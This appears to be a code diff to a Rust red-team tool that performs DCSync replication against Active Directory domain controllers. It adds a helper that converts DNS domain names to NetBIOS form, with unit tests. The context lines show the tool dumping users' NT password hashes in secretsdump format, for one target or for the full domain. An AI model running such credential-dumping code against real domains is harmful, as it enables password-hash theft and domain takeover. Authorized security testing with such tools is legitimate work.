@@ -76,6 +76,12 @@ async fn dcsync_impl(mut a: DcsyncArgs, checklist: &mut ui::StageChecklist) -> R
     let mut sess =
         DrsSession::bind(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password).await?;
     checklist.record_ok("DRSUAPI bind", "sealed replication handle");
+    // Task J fix: DsCrackNames uses DS_NT4_ACCOUNT_NAME which expects NETBIOS\name.
+    // If the caller passed a DNS domain (`testlab.local`), the CrackNames step
+    // returns status 2 (name not found). Auto-normalize the leftmost DNS label
+    // to uppercase NetBIOS form — the standard convention for a well-formed AD
+    // domain (verified against testlab.local 2019+2022 DCs, 2026-09-14).
+    let nb_domain = netbios_from_dns(&a.auth.domain);
     match a.target {
         None => {
             let handle_hex: String = sess.handle().iter().map(|b| format!("{b:02x}")).collect();
@@ -83,7 +89,7 @@ async fn dcsync_impl(mut a: DcsyncArgs, checklist: &mut ui::StageChecklist) -> R
             checklist.record_skipped("replicate target", "no --target set — bind-only check");
         }
         Some(t) => {
-            let (rid, nt, kerb) = sess.dcsync(&a.auth.domain, &t).await?;
+            let (rid, nt, kerb) = sess.dcsync(&nb_domain, &t).await?;
             let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
             // secretsdump format: user:rid:lmhash:nthash:::  (LM is the empty-string hash)
             println!(
@@ -166,7 +172,7 @@ async fn dcsync_all(a: &DcsyncArgs, checklist: &mut ui::StageChecklist) -> Resul
     checklist.record_ok("DRSUAPI bind", "sealed replication handle");
     let (mut ok, mut fail) = (0u32, 0u32);
     for (_rid, name) in &users {
-        match sess.dcsync(&a.auth.domain, name).await {
+        match sess.dcsync(&netbios_from_dns(&a.auth.domain), name).await {
             Ok((rid, nt, kerb)) => {
                 let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
                 println!(
@@ -187,4 +193,36 @@ async fn dcsync_all(a: &DcsyncArgs, checklist: &mut ui::StageChecklist) -> Resul
     eprintln!("[+] full-domain DCSync complete: {ok} dumped, {fail} failed");
     checklist.record_ok("replicate all", format!("{ok} dumped · {fail} failed"));
     Ok(())
+}
+
+/// Task J (1.5.2 post-live-fire): DsCrackNames' DS_NT4_ACCOUNT_NAME format expects
+/// `NETBIOS\name`, not `DNS\name`. When the caller passes a dotted DNS domain
+/// (`testlab.local`), split on the first dot and uppercase the leftmost label —
+/// that is the standard AD NetBIOS convention for a well-formed domain.
+/// Non-dotted input is returned uppercased (already NetBIOS-ish) so
+/// `--domain TESTLAB` continues to work verbatim. This is a heuristic — a
+/// domain whose NetBIOS name genuinely differs from the leftmost DNS label
+/// (rare, but possible) still needs the operator to pass the NetBIOS name
+/// explicitly.
+fn netbios_from_dns(d: &str) -> String {
+    d.split_once('.')
+        .map(|(l, _)| l.to_ascii_uppercase())
+        .unwrap_or_else(|| d.to_ascii_uppercase())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::netbios_from_dns;
+
+    #[test]
+    fn strips_and_uppercases_dns_label() {
+        assert_eq!(netbios_from_dns("testlab.local"), "TESTLAB");
+        assert_eq!(netbios_from_dns("corp.example.com"), "CORP");
+    }
+
+    #[test]
+    fn passes_through_bare_netbios() {
+        assert_eq!(netbios_from_dns("TESTLAB"), "TESTLAB");
+        assert_eq!(netbios_from_dns("corp"), "CORP");
+    }
 }
